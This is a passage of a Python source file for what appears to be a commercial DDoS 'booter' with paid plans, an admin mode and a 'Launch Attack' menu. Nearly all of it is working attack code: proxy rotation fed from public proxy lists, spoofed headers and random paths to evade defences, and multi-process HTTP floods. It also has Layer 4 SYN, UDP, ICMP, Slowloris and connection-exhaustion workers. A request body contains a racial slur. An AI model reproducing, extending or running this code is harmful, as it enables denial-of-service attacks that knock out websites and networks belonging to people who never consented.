    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
]

# ================== PROXY MANAGEMENT ==================
proxies_enabled = False           # master switch: if True, we attempt to use proxies from the active source
file_proxies_enabled = False      # admin-only: use file proxies
public_proxies_enabled = False    # anyone: use public proxies (fetched from web)

file_proxies = []                 # proxies loaded from file (admin only)
public_proxies = []                # proxies fetched from public sources
proxy_lock = asyncio.Lock()        # to safely update proxy lists

# For round‑robin proxy selection within each process
proxy_index = 0
proxy_index_lock = threading.Lock()

last_proxy_refresh = 0
PROXY_REFRESH_INTERVAL = 300       # seconds

# Lock for printing Layer 4 activity lines
print_lock = threading.Lock()

def parse_proxy_line(line):
    """Parse a proxy line which can be:
       - ip:port
       - ip:port:username:password
       - protocol://user:pass@ip:port
    Returns a full proxy URL string.
    """
    line = line.strip()
    if not line:
        return None
    # Already has protocol?
    if line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return line
    # Check for ip:port:user:pass format
    parts = line.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    else:
        return None

def load_file_proxies(file_path="proxies.txt"):
    """Load proxies from file (admin only)."""
    global file_proxies
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        new_proxies = []
        for line in lines:
            url = parse_proxy_line(line)
            if url:
                new_proxies.append(url)
        file_proxies = new_proxies
        print(f"  Loaded {len(file_proxies)} proxies from {file_path}")
    except FileNotFoundError:
        print(f"  {file_path} not found.")
        file_proxies = []
    except Exception as e:
        print(f"  Error loading proxies: {e}")
        file_proxies = []

async def fetch_proxies_from_source(source_url, proxy_type='http'):
    """Fetch proxies from a given source URL with timeout."""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(source_url) as resp:
                if resp.status != 200:
                    return []
                text = await resp.text()
                lines = text.strip().split('\n')
                proxies = []
                for line in lines:
                    line = line.strip()
                    if re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line):
                        proxies.append(f"{proxy_type}://{line}")
                return proxies
    except:
        return []

async def fetch_proxies_from_multiple_sources():
    """Gather proxies from various public sources."""
    sources = [
        ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all', 'http'),
        ('https://www.proxy-list.download/api/v1/get?type=http', 'http'),
        ('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', 'http'),
        ('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt', 'http'),
        ('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt', 'http'),
        ('https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list-data.txt', 'http'),
    ]
    tasks = [fetch_proxies_from_source(url, ptype) for url, ptype in sources]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    all_proxies = []
    for res in results:
        if isinstance(res, list):
            all_proxies.extend(res)
    return list(set(all_proxies))

async def refresh_public_proxies(force=False):
    """Fetch and update public proxy list in background."""
    global public_proxies, last_proxy_refresh
    now = time.time()
    if not force and (now - last_proxy_refresh) < PROXY_REFRESH_INTERVAL:
        return
    print(f"{current_color}[*] Refreshing public proxy list in background...{RESET}")
    raw_proxies = await fetch_proxies_from_multiple_sources()
    if raw_proxies:
        async with proxy_lock:
            public_proxies = raw_proxies
            last_proxy_refresh = now
        print(f"{current_color}[+] Public proxy list updated: {len(public_proxies)} proxies.{RESET}")
    else:
        print(f"{current_color}[!] No public proxies fetched, keeping old list ({len(public_proxies)} proxies).{RESET}")

def get_next_proxy():
    """Return the next proxy in round‑robin order from the currently active source."""
    global proxy_index
    if not proxies_enabled:
        return None
    # Priority: file proxies if enabled and admin
    if admin_mode and file_proxies_enabled and file_proxies:
        with proxy_index_lock:
            proxy = file_proxies[proxy_index % len(file_proxies)]
            proxy_index += 1
            return proxy
    elif public_proxies_enabled and public_proxies:
        with proxy_index_lock:
            proxy = public_proxies[proxy_index % len(public_proxies)]
            proxy_index += 1
            return proxy
    return None

# ================== USER AGENT & BYPASS UTILS ==================
def get_random_user_agent():
    return random.choice(USER_AGENTS)

def c(text):
    return f"{current_color}{text}{RESET}"

def clear_screen():
    print("\033[H\033[J", end="")
    sys.stdout.flush()
    print("\033[2J\033[H", end="")
    sys.stdout.flush()

def header():
    clear_screen()
    plan_info = PLANS[current_license['plan']]
    admin_indicator = " [ADMIN]" if admin_mode else ""
    
    print(f"""
{current_color}{BOLD}
{ASCII_MENUS[current_ascii]}
  Made by: bob
{RESET}
{current_color} User: {plan_info['name']}{admin_indicator} •{RESET}
{current_color}
  ┌────────────────────────────────────┐
  │ [1] Launch Attack                  │
  │ [2] Methods+                       │
  │ [3] Color Schemes                  │
  │ [4] View Workers                   │
  │ [5] Plans+                         │
  │ [6] Change ASCII Menu              │
  │ [7] Refresh                        │
  │ [8] Proxy Settings                  │
  │ [9] Admin Panel                     │
  │ [10] Reconnaissance                 │
  │ [0] Exit                           │
  └────────────────────────────────────┘
{RESET}""")

def generate_random_path(base_url):
    paths = ['/api', '/v1', '/data', '/stats', '/images', '/css', '/js', '/admin', '/login', '/wp-admin', '/wp-content', '/assets', '/public']
    extensions = ['', '.php', '.asp', '.jsp', '.html', '.htm', '.aspx']
    path = random.choice(paths) + random.choice(extensions) if random.random() > 0.3 else ''
    query = f"?{random.randint(1000,9999)}={random.randint(1,100)}&_={int(time.time())}" if random.random() > 0.5 else ''
    return base_url.rstrip('/') + path + query

def generate_random_headers():
    headers = {
        'Accept': random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json, text/plain, */*', 'image/webp,*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.7']),
        'Referer': random.choice(['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', 'https://duckduckgo.com/', '']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    return headers

# ================== LAYER 7 WORKER (asyncio task) ==================
async def http_worker(session, url, end_time, worker_id, method, req_counter, err_counter, status_dict, latency_list):
    """Individual asyncio task for a worker."""
    user_agent = get_random_user_agent()
    headers = {'User-Agent': user_agent}
    
    if method in ['BROWSER', 'HULK']:
        headers.update({
            'X-Test-ID': f'worker-{worker_id}',
            'X-Load-Test': 'true'
        })
    
    if method in ['BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH']:
        headers.update(generate_random_headers())
    
    # Determine if this method is a "burst" method (no sleep between requests)
    burst_methods = ['STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD', 'SOCKET-AMP', 'NET-BYPASS', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH']
    is_burst = method in burst_methods
    
    while time.time() < end_time:
        try:
            start = time.perf_counter()
            
            # Choose next proxy (round‑robin)
            proxy = get_next_proxy()
            
            # Build request URL with optional random path
            request_url = url
            if method in ['RANDOM-PATH', 'BYPASS-GET', 'BYPASS-POST']:
                request_url = generate_random_path(url)
            
            # Perform request based on method
            if method == 'HTTP GET':
                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'HTTPS GET':
                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            elif method in ['HTTP POST', 'HTTPS POST', 'BYPASS-POST']:
                post_url = request_url
                if method == 'HTTP POST':
                    post_url = request_url.replace('https://', 'http://')
                data = {'niggadih': 'cumdata', 'bot_id': worker_id, 'timestamp': time.time()}
                if method == 'BYPASS-POST':
                    data['rand'] = random.randint(1,1000000)
                    data['session'] = ''.join(random.choices('abcdef0123456789', k=16))
                async with session.post(post_url, headers=headers, json=data, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'CURL':
                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'GET/POST MIX':
                if random.random() > 0.5:
                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                        await resp.read()
                else:
                    data = {'test': 'data', 'worker_id': worker_id}
                    async with session.post(request_url, headers=headers, json=data, timeout=3, proxy=proxy) as resp:
                        await resp.read()
            elif method in ['BROWSER', 'HULK']:
                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'DNS-AMP':
                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'STRESS TEST':
                for _ in range(50):
                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                        await resp.read()
                        req_counter.value += 1
                        status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                continue
            elif method == 'TLS-VIP':
                for _ in range(5):
                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                        await resp.read()
                        req_counter.value += 1
                        status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                continue
            elif method == 'CONCURRENT HOLD':
                for _ in range(99):
                    if random.random() > 0.5:
                        async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                            await resp.read()
                    else:
                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=3, proxy=proxy) as resp:
                            await resp.read()
                    req_counter.value += 1
                    status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                continue
            elif method == 'SOCKET-AMP':
                for _ in range(5):
                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                        await resp.read()
                        req_counter.value += 1
                        status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                continue
            elif method == 'NET-BYPASS':
                for _ in range(100):
                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                        await resp.read()
                        req_counter.value += 1
                        status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                continue
            elif method == 'BYPASS-GET':
                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                    await resp.read()
            # For all single-request methods, update stats
            latency = time.perf_counter() - start
            req_counter.value += 1
            latency_list.append(latency)
            status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                    
        except Exception:
            err_counter.value += 1

        # Rate limiting: only if not a burst method
        if not is_burst:
            await asyncio.sleep(random.uniform(0.1, 0.5))
        # else: no sleep, go as fast as possible

def run_process_workers(process_id, url, method, workers_per_process, duration, req_counter, err_counter, status_dict, latency_list):
    """Entry point for each process: runs its own asyncio loop."""
    asyncio.run(asyncio_worker_process(process_id, url, method, workers_per_process, duration, req_counter, err_counter, status_dict, latency_list))

async def asyncio_worker_process(process_id, url, method, workers, duration, req_counter, err_counter, status_dict, latency_list):
    """Asyncio coroutine for a process."""
    end_time = time.time() + duration
    # Increase per-host connection limit to 1000 for aggressive concurrency
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=1000, force_close=False, enable_cleanup_closed=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(workers):
            task = asyncio.create_task(http_worker(session, url, end_time, f"P{process_id}-W{i}", method, req_counter, err_counter, status_dict, latency_list))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)

async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_counter, err_counter, status_dict, latency_list):
    """Multi‑process Layer 7 attack."""
    num_processes = mp.cpu_count()
    workers_per_process = total_workers // num_processes
    remainder = total_workers % num_processes
    processes = []
    
    # Reset proxy index for each attack (so each process gets a fresh round‑robin start)
    global proxy_index
    proxy_index = 0
    
    # Start processes
    for i in range(num_processes):
        w = workers_per_process + (1 if i < remainder else 0)
        p = mp.Process(target=run_process_workers, args=(i, url, method, w, duration, req_counter, err_counter, status_dict, latency_list))
        p.start()
        processes.append(p)
    
    # Stats display loop (main process)
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            reqs = req_counter.value
            errs = err_counter.value
            rps = reqs / elapsed if elapsed > 0 else 0
            avg_latency = 0
            if len(latency_list) > 0:
                avg_latency = sum(latency_list) / len(latency_list) * 1000
            codes = sorted(status_dict.items(), key=lambda x: x[1], reverse=True)[:5]
            
            clear_screen()
            print(f"{current_color}{BOLD}╔══ LAYER 7 ATTACK (MULTI‑PROCESS) ══╗{RESET}\n")
            print(f"{current_color}  Plan: {RESET}{plan_name}")
            print(f"{current_color}  Method: {RESET}{method}")
            print(f"{current_color}  Target: {RESET}{url}")
            print(f"{current_color}  Workers: {RESET}{total_workers} ({num_processes} processes)")
            print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
            print(f"{current_color}  Proxies: {RESET}{'Enabled' if proxies_enabled else 'Disabled'}")
            if proxies_enabled:
                active_source = "File (admin)" if (admin_mode and file_proxies_enabled and file_proxies) else "Public" if public_proxies_enabled else "None"
                count = len(file_proxies) if (admin_mode and file_proxies_enabled) else len(public_proxies) if public_proxies_enabled else 0
                print(f"{current_color}  Proxy source: {RESET}{active_source} ({count})")
            print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
            print(f"    Requests: {reqs:,}")
            print(f"    Errors: {errs:,}")
            print(f"    RPS: {rps:.2f}")
            print(f"    Avg Latency: {avg_latency:.0f} ms")
            
            if codes:
                print(f"\n{current_color}{BOLD}  Status Codes:{RESET}")
                for code, count in codes:
                    print(f"    {code}: {count:,}")
            
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{current_color}attack interrupted.{RESET}")
    finally:
        for p in processes:
            p.terminate()
        for p in processes:
            p.join()

# ================== LAYER 4 WORKERS ==================
# (unchanged from previous version)
def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
    if not HAS_SCAPY:
        return
    from scapy.all import IP, TCP, send
    ip = IP(dst=target_ip)
    while time.time() < end_time:
        try:
            sport = random.randint(1024, 65535)
            packet = ip / TCP(sport=sport, dport=target_port, flags="S")
            send(packet, verbose=False)
            req_counter.value += 1
            ports_hit_list.append(target_port)
            with print_lock:
                remaining = int(end_time - time.time())
                print(f"TCP SYN FLOOD {target_ip}:{target_port} {remaining}s")
        except:
            err_counter.value += 1

def udp_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            payload = os.urandom(random.randint(1024, 1472))
            sock.sendto(payload, (target_ip, target_port))
            req_counter.value += 1
            ports_hit_list.append(target_port)
            with print_lock:
                remaining = int(end_time - time.time())
                print(f"UDP FLOOD {target_ip}:{target_port} {remaining}s")
        except:
            err_counter.value += 1

def icmp_flood_worker(target_ip, worker_id, end_time, req_counter, err_counter, *args):
    if not HAS_SCAPY:
        return
    from scapy.all import IP, ICMP, send
    ip = IP(dst=target_ip)
    while time.time() < end_time:
        try:
            packet = ip / ICMP()
            send(packet, verbose=False)
            req_counter.value += 1
            with print_lock:
                remaining = int(end_time - time.time())
                print(f"ICMP FLOOD {target_ip} {remaining}s")
        except:
            err_counter.value += 1

def slowloris_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter, *args):
    socks = []
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            partial = f"GET /{os.urandom(16).hex()} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
            sock.send(partial)
            socks.append(sock)
            conn_counter.value += 1
            ports_hit_list.append(target_port)
            with print_lock:
                remaining = int(end_time - time.time())
                print(f"SLOWLORIS {target_ip}:{target_port} {remaining}s")
            time.sleep(5)
            for s in socks[-50:]:
                try:
                    s.send(b"X-a: b\r\n")
                    req_counter.value += 1
                    with print_lock:
                        remaining = int(end_time - time.time())
                        print(f"SLOWLORIS {target_ip}:{target_port} {remaining}s")
                except:
                    pass
        except:
            err_counter.value += 1
        time.sleep(0.1)

def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter, *args):
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((target_ip, target_port))
            conn_counter.value += 1
            ports_hit_list.append(target_port)
            with print_lock:
                remaining = int(end_time - time.time())
                print(f"CONNECTION EXHAUSTION {target_ip}:{target_port} {remaining}s")
            time.sleep(10)
            sock.close()
        except:
            err_counter.value += 1

def port_scan_worker(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
    ports_to_scan = list(range(1, 1025))
    random.shuffle(ports_to_scan)
    for port in ports_to_scan:
        if time.time() >= end_time:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                ports_hit_list.append(port)
                for _ in range(10):
                    try:
                        sock.send(os.urandom(1024))
                        req_counter.value += 1
                        with print_lock:
                            remaining = int(end_time - time.time())
                            print(f"PORT SCAN & ATTACK {target_ip}:{port} {remaining}s")
                    except:
                        break
            sock.close()
        except:
            pass

async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter):
    """Run Layer 4 attack using thread pool."""
    target_ports = []
    if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
        port_input = input(f"  Target port(s) (e.g., 80,443, or range 1-1024) → ").strip()
        if '-' in port_input:
            start, end = map(int, port_input.split('-'))
            target_ports = list(range(start, end+1))
        elif ',' in port_input:
            target_ports = [int(p.strip()) for p in port_input.split(',')]
        else:
            target_ports = [int(port_input)]
    
    worker_func = None
    if method == 'TCP SYN FLOOD':
        worker_func = tcp_syn_flood_worker
    elif method == 'UDP FLOOD':
        worker_func = udp_flood_worker
    elif method == 'ICMP FLOOD':
        worker_func = icmp_flood_worker
    elif method == 'SLOWLORIS':
        worker_func = slowloris_worker
    elif method == 'CONNECTION EXHAUSTION':
        worker_func = connection_exhaustion_worker
    elif method == 'PORT SCAN & ATTACK':
        worker_func = port_scan_worker
    else:
        print("  Unknown Layer 4 method.")
        return
    
    end_time = time.time() + duration
    
    def worker_wrapper(worker_id):
        nonlocal target_ports
        while time.time() < end_time:
            if target_ports:
                port = random.choice(target_ports) if target_ports else None
                if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
                    worker_func(target_ip, port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter)
                elif method == 'ICMP FLOOD':
                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter)
                elif method == 'PORT SCAN & ATTACK':
                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
            else:
                if method == 'ICMP FLOOD':
                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter)
                elif method == 'PORT SCAN & ATTACK':
                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
        for f in futures:
            f.result()
        print(f"\n{current_color}Attack finished.{RESET}")

# ================== METHOD SELECTION ==================
def select_method():
    if admin_mode:
        available_methods = ALL_METHODS
        plan_name = "ADMIN"
    else:
        plan_info = PLANS[current_license['plan']]
        available_methods = plan_info['methods']
        plan_name = plan_info['name']
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══ SELECT ATTACK METHOD ══╗{RESET}\n")
    print(f"  Available methods for {plan_name}:\n")
    
    for idx, method in enumerate(available_methods, 1):
        desc = METHOD_DESCRIPTIONS.get(method, 'No description available.')
        print(f"{current_color}  {idx}) {RESET}{method}")
        print(f"      {desc}")
    
    print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
    
    try:
        choice = int(input(f"\n  Select method (1-{len(available_methods)}) → "))
        if 1 <= choice <= len(available_methods):
            return available_methods[choice - 1]
        else:
            print(f"\n  Invalid selection, using default: {available_methods[0]}")
            time.sleep(1)
            return available_methods[0]
    except:
        print(f"\n  Invalid input, using default: {available_methods[0]}")
        time.sleep(1)
        return available_methods[0]

async def run_load_test(req_counter, err_counter, status_dict, latency_list, ports_hit_list, conn_counter):
    global stats_start_time
    if admin_mode:
        max_workers = ADMIN_WORKERS
        max_duration = ADMIN_DURATION
        plan_name = "ADMIN"
    else:
        plan_info = PLANS[current_license['plan']]
        max_workers = plan_info['workers']
        max_duration = plan_info['duration']
        plan_name = plan_info['name']
    
    if datetime.now() > current_license['expires'] and not admin_mode:
        clear_screen()
        print(f"{current_color}{BOLD}╔══ LICENSE EXPIRED ══╗{RESET}")
        print(f"\n  Your license has expired!")
        print(f"  Please renew in 'Plan Management' menu.")
        input(f"\n  Press ENTER to return...")
        return
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}")

    target = input(f"  Target (URL for L7, IP for L4) → ").strip()
    if not target:
        print("  No target entered.")
        return

    consent = input(f"\n  Do you have permission to attack? (y/n) → ").strip().lower()
    if consent not in ['y', 'yes']:
        print(f"\n{current_color}Test cancelled.{RESET}")
        input(f"\n  Press ENTER to return...")
        return

    method = select_method()
    is_layer4 = method in LAYER4_METHODS

    if is_layer4:
        try:
            socket.inet_aton(target)
        except socket.error:
            print(f"\n  For Layer 4 attacks, target must be an IP address.")
            input(f"\n  Press ENTER to return...")
            return
        if method in ['TCP SYN FLOOD', 'ICMP FLOOD'] and os.geteuid() != 0:
            print(f"\n  {method} requires root. Please run with sudo.")
            input(f"\n  Press ENTER to return...")
            return
        target_ip = target
        url = None
    else:
        if not target.startswith(('http://','https://')):
            target = 'https://' + target
        url = target
        target_ip = None

    try:
        workers = int(input(f"\n Concurrent workers (max {max_workers}) → ") or max_workers)
        workers = min(workers, max_workers)
    except:
        workers = min(10, max_workers)

    try:
        duration = int(input(f"  Duration in seconds (max {max_duration}) → ") or 60)
        duration = min(duration, max_duration)
    except:
        duration = min(60, max_duration)

    # Start public proxy refresh in background if enabled
    if not is_layer4 and public_proxies_enabled:
        asyncio.create_task(refresh_public_proxies(force=True))

    print(f"\n{current_color}{BOLD}Starting attack...{RESET}")
    print(f"  Plan: {plan_name}")
    print(f"  Method: {method}")
    if is_layer4:
        print(f"  Target IP: {target_ip}")
    else:
        print(f"  Target URL: {url}")
    print(f"  Workers: {workers}")
    print(f"  Duration: {duration}s")
    if not is_layer4 and proxies_enabled:
        if admin_mode and file_proxies_enabled and file_proxies:
            print(f"  Proxies: File (admin) – {len(file_proxies)} loaded")
        elif public_proxies_enabled:
            print(f"  Proxies: Public – {len(public_proxies)} available")
        else:
            print(f"  Proxies: Enabled but no source active")
    elif is_layer4:
        print(f"  Proxies: Not used for Layer 4")
    else:
        print(f"  Proxies: Disabled")

    stats_start_time = time.time()
    req_counter.value = 0
    err_counter.value = 0
    status_dict.clear()
    latency_list[:] = []
    ports_hit_list[:] = []
    conn_counter.value = 0

    if is_layer4:
        await run_layer4_attack(target_ip, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter)
    else:
        await run_layer7_mp(url, method, workers, duration, plan_name, req_counter, err_counter, status_dict, latency_list)

    elapsed = time.time() - stats_start_time
    reqs = req_counter.value
    errs = err_counter.value
    print(f"\n{current_color}{BOLD}╔══ ATTACK OVER ══╗{RESET}")
    if is_layer4:
        print(f"  Total Packets: {reqs:,}")
        print(f"  Total Errors: {errs:,}")
